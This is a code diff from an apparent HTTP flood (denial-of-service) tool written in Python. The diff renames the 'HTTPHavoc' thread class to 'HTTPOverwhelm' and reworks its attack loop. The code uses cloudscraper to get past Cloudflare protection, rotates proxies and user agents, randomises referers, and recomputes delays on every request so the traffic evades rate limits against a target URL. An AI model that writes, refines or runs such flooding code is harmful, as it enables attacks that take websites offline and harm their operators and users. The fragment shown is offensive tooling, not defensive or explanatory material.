@@ -7,9 +7,9 @@ import cloudscraper
 import requests
 
 import config
-from utils.network import get_random_proxy, get_random_user_agent
+from utils.network import get_random_user_agent
 
-class HTTPHavoc(threading.Thread):
+class HTTPOverwhelm(threading.Thread):
     def __init__(self, target_url, mode):
         super().__init__()
         self.daemon = True
@@ -18,6 +18,9 @@ class HTTPHavoc(threading.Thread):
         self.scraper = cloudscraper.create_scraper()
 
     def get_attack_params(self):
+        if not config.proxies:
+            return config.adaptive_delay.value
+        
         delay = 0
         if self.mode == "Guerilla":
             delay = random.uniform(0.8, 2.5)
@@ -43,10 +46,10 @@ class HTTPHavoc(threading.Thread):
 
     def run(self):
         config.attack_stats["active_threads"] += 1
-        delay = self.get_attack_params()
         
         while not config.stop_event.is_set():
-            proxy = get_random_proxy()
+            delay = self.get_attack_params()
+            proxy = config.proxies if config.proxies else None
             referer = urljoin(self.target_url, str(random.randint(1,1000)))
             headers = self.build_headers(referer)
             
